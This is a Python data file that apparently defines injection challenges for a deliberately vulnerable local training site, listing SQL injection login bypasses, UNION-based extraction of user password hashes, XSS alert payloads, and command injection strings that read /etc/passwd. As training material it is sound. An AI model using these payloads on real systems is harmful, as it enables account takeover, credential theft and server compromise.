"""A05:2025 — Injection (SQLi / XSS / CmdI) — VulnSite Challenges"""
SECTION = {
    "id": "a05", "name": "A05:2025 — Injection (SQLi / XSS / CmdI)",
    "theory": "Injection flaws occur when untrusted data is sent to an interpreter.\nSQL Injection, XSS, and Command Injection are the most common.\n\n🎯 TARGET: ShopSim VulnSite at http://localhost:8080",
    "stages": [
        {"name": "Stage 1: SQL Injection — Login Bypass", "min_difficulty": "easy", "techniques": [
            {"id": "sqli_1", "description": "Login as admin without knowing the password.", "target_page": "/login", "payload": "' OR '1'='1'--",
             "hint": "Try injecting SQL in the email field.", "steps_easy": ["Go to /login", "Email: ' OR '1'='1'--", "Password: anything", "Click Login — you're admin!"]},
            {"id": "sqli_2", "description": "Login as admin using comment injection.", "target_page": "/login", "payload": "admin@shopsim.com'--",
             "hint": "Close the email string and comment out the password check.", "steps_easy": ["Email: admin@shopsim.com'--", "Password: anything", "The -- comments out the password check"]},
            {"id": "sqli_3", "description": "Bypass login with OR 1=1# (MySQL style).", "target_page": "/login", "payload": "' OR 1=1#",
             "hint": "Try MySQL-style comments with #.", "steps_easy": ["Email: ' OR 1=1#", "Password: anything"]},
            {"id": "sqli_4", "description": "Bypass with parentheses.", "target_page": "/login", "payload": "') OR ('1'='1",
             "hint": "Some queries wrap values in parentheses.", "steps_easy": ["Email: ') OR ('1'='1", "Password: anything"]},
        ]},
        {"name": "Stage 2: SQL Injection — Search Data Extraction", "min_difficulty": "normal", "techniques": [
            {"id": "sqli_5", "description": "Extract data using UNION SELECT in the search bar.", "target_page": "/search", "payload": "' UNION SELECT 1,2,3,4,5--",
             "hint": "Use UNION SELECT to find the column count.", "steps_easy": ["Go to /search", "Type: ' UNION SELECT 1,2,3,4,5--", "Adjust the number of columns until it works"]},
            {"id": "sqli_6", "description": "Extract all usernames and password hashes.", "target_page": "/search",
             "payload": "' UNION SELECT 1,username,password,email,role FROM users--",
             "hint": "Replace column numbers with actual column names from the users table.",
             "steps_easy": ["Search: ' UNION SELECT 1,username,password,email,role FROM users--", "You'll see all user credentials in the results"]},
        ]},
        {"name": "Stage 3: XSS — Cross-Site Scripting", "min_difficulty": "easy", "techniques": [
            {"id": "xss_1", "description": "Perform reflected XSS via the search bar.", "target_page": "/search",
             "payload": "<script>alert('XSS')</script>",
             "hint": "The search query is reflected on the page without sanitization.",
             "steps_easy": ["Go to /search", "Search for: <script>alert('XSS')</script>", "You should see a JavaScript alert popup"]},
            {"id": "xss_2", "description": "Store an XSS payload in a product review.", "target_page": "/product/1",
             "payload": "<img src=x onerror=alert('XSS')>",
             "hint": "Product reviews are stored and displayed to all users.",
             "steps_easy": ["Login, go to /product/1", "Write a review with: <img src=x onerror=alert('XSS')>", "Every user viewing this product will execute your script"]},
        ]},
        {"name": "Stage 4: Command Injection", "min_difficulty": "normal", "techniques": [
            {"id": "cmdi_1", "description": "Inject a command via the contact form email field.", "target_page": "/contact",
             "payload": "test@test.com; id", "hint": "The email validation uses os.popen() in easy mode.",
             "steps_easy": ["Go to /contact", "In the email field: test@test.com; id", "The server executes 'id' command — you can run any command!"]},
            {"id": "cmdi_2", "description": "Read /etc/passwd through command injection.", "target_page": "/contact",
             "payload": "test@test.com; cat /etc/passwd", "hint": "Chain commands with semicolons.",
             "steps_easy": ["Email: test@test.com; cat /etc/passwd", "Server executes cat /etc/passwd"]},
        ]},
        {"name": "Stage 5: Blind & Advanced", "min_difficulty": "hard", "techniques": [
            {"id": "sqli_blind", "description": "Confirm blind SQLi on login (boolean-based).", "target_page": "/login",
             "payload": "admin@shopsim.com' AND 1=1--",
             "hint": "Compare response for AND 1=1 (true) vs AND 1=2 (false).",
             "steps_easy": ["Email: admin@shopsim.com' AND 1=1-- → login succeeds", "Email: admin@shopsim.com' AND 1=2-- → login fails", "Confirms blind SQLi!"]},
        ]},
    ],
    "external_labs": {
        "free": [("PortSwigger — SQLi", "https://portswigger.net/web-security/sql-injection"), ("PortSwigger — XSS", "https://portswigger.net/web-security/cross-site-scripting")],
        "paid": [("HTB Academy — SQLi", "https://academy.hackthebox.com/module/details/33")],
    },
}
